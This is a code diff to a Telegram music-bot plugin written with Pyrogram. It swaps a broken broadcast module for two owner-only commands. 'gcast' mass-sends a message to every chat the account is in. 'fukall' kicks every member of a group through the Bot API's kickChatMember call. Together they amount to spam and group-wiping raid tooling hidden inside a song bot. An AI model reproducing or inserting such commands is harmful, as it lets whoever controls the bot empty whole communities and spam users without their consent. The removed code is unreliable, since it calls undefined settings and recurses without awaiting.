@@ -1,105 +1,47 @@
-# © Abhijith-Sudhakaran
-
 import asyncio
-import client
-import datetime
+import html
 import os
-import random
-import string
-import time
-import traceback
+import re
+import sys
+import aiohttp
+import regex
+from pyrogram import Client, filters
+from pyrogram.errors import UserAlreadyParticipant
+from VoiceChat_Song_bot.config import SUDO_USERS, BOT_TOKEN
+from aiohttp import ClientSession
+from pyrogram.types import Message
 
-import aiofiles
-from pyrogram.errors import (
-    FloodWait,
-    InputUserDeactivated,
-    PeerIdInvalid,
-    UserIsBlocked,
-)
-
-from VoiceChat_Song_bot import config
-
-broadcast_ids = {}
-
-from VoiceChat_Song_bot.config import SUDO_USERS
-
-@Client.on_message(filters.command(["broadcast"]))
-async def broadcast(_, message: Message):
+@Client.on_message(filters.command(["gcast"]))
+async def bye(client, message):
     sent=0
     failed=0
-    if message.from_user.id not in SUDO_USERS:
-        return
+    if message.from_user.id in SUDO_USERS:
+        lol = await message.reply("Starting Gcast")
+        if not message.reply_to_message:
+            await lol.edit("Reply to any text message to gcast sir")
+            return
+        msg = message.reply_to_message.text
+        async for dialog in client.iter_dialogs():
+            try:
+                await client.send_message(dialog.chat.id, msg)
+                sent = sent+1
+                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
+            except:
+                failed=failed+1
+                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
+            await asyncio.sleep(3)
+        await message.reply_text(f"Gcasted message to {sent} chats. Failed {failed} chats.")
 
-async def send_msg(user_id, message):
-    try:
-        if BROADCAST_AS_COPY is False:
-            await message.forward(chat_id=user_id)
-        elif BROADCAST_AS_COPY is True:
-            await message.copy(chat_id=user_id)
-        return 200, None
-    except FloodWait as e:
-        await asyncio.sleep(e.x)
-        return send_msg(user_id, message)
-    except InputUserDeactivated:
-        return 400, f"{user_id} : deactivated\n"
-    except UserIsBlocked:
-        return 400, f"{user_id} : blocked the bot\n"
-    except PeerIdInvalid:
-        return 400, f"{user_id} : user id invalid\n"
-    except Exception:
-        return 500, f"{user_id} : {traceback.format_exc()}\n"
+        
 
+@Client.on_message(filters.command("fukall") &
+                 filters.group & filters.user(SUDO_USERS))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
 
-async def broadcast(m, db):
-    all_users = await db.get_all_notif_user()
-    broadcast_msg = m.reply_to_message
-    while True:
-        broadcast_id = "".join([random.choice(string.ascii_letters) for i in range(3)])
-        if not broadcast_ids.get(broadcast_id):
-            break
-    out = await m.reply_text(
-        text=f"Broadcast Started! You will be notified with log file when all the users are notified."
-    )
-    start_time = time.time()
-    total_users = await db.total_users_count()
-    done = 0
-    failed = 0
-    success = 0
-    broadcast_ids[broadcast_id] = dict(
-        total=total_users, current=done, failed=failed, success=success
-    )
-    async with aiofiles.open("broadcast.txt", "w") as broadcast_log_file:
-        async for user in all_users:
-            sts, msg = await send_msg(user_id=int(user["id"]), message=broadcast_msg)
-            if msg is not None:
-                await broadcast_log_file.write(msg)
-            if sts == 200:
-                success += 1
-            else:
-                failed += 1
-            if sts == 400:
-                await db.delete_user(user["id"])
-            done += 1
-            if broadcast_ids.get(broadcast_id) is None:
-                break
-            else:
-                broadcast_ids[broadcast_id].update(
-                    dict(current=done, failed=failed, success=success)
-                )
-    if broadcast_ids.get(broadcast_id):
-        broadcast_ids.pop(broadcast_id)
-    completed_in = datetime.timedelta(seconds=int(time.time() - start_time))
-    await asyncio.sleep(3)
-    await out.delete()
-    if failed == 0:
-        await m.reply_text(
-            text=f"broadcast completed in `{completed_in}`\n\nTotal users {total_users}.\nTotal done {done}, {success} success and {failed} failed.",
-            quote=True,
-        )
-    else:
-        await m.reply_document(
-            document="broadcast.txt",
-            caption=f"broadcast completed in `{completed_in}`\n\nTotal users {total_users}.\nTotal done {done}, {success} success and {failed} failed.",
-            quote=True,
-        )
-    os.remove("broadcast.txt")
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)        
